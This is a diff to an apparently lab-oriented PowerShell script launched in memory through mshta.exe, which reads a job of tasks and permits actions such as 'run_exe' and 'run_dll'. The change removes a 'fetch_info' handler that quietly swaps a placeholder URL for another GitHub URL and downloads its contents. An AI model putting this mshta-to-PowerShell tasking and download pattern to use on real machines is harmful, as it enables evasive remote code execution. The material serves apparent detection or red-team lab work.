@@ -1,5 +1,5 @@
 # Child PowerShell script executed in-memory via mshta.exe
-Write-Host "PowerShell Launched via mshta.exe -> Inline JS -> PowerShell" -ForegroundColor Green
+Write-Host "PowerShell Launched via mshta.exe → Inline JS → PowerShell" -ForegroundColor Green
 
 # Log parent process ID
 try {
@@ -31,7 +31,7 @@ try {
 }
 
 # Process tasks
-$allowed = @('print', 'list_dir', 'fetch_info', 'run_exe', 'run_dll')
+$allowed = @('print', 'list_dir', 'run_exe', 'run_dll')
 foreach ($t in $job.tasks) {
     $act = ("" + $t.action).ToLower()
     if ($allowed -notcontains $act) {
@@ -53,22 +53,6 @@ foreach ($t in $job.tasks) {
                 }
             } catch {
                 Write-Host "LIST_DIR error: $($_.Exception.Message)" -ForegroundColor Red
-            }
-        }
-        'fetch_info' {
-            $url = $t.url -as [string]
-            if ($url -eq "https://raw.githubusercontent.com/your-org/lab-files/main/sample.txt") {
-                $url = "https://raw.githubusercontent.com/shateel-ulab/mshta-labwork/refs/heads/main/task.json"
-                Write-Host "FETCH_INFO: Replaced URL with $url" -ForegroundColor Yellow
-            }
-            try {
-                $wc = New-Object System.Net.WebClient
-                $wc.Encoding = [System.Text.Encoding]::UTF8
-                $data = $wc.DownloadString($url)
-                $len = $data.Length
-                Write-Host "FETCH_INFO: $url len=$len" -ForegroundColor White
-            } catch {
-                Write-Host "FETCH_INFO error: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
         'run_exe' {
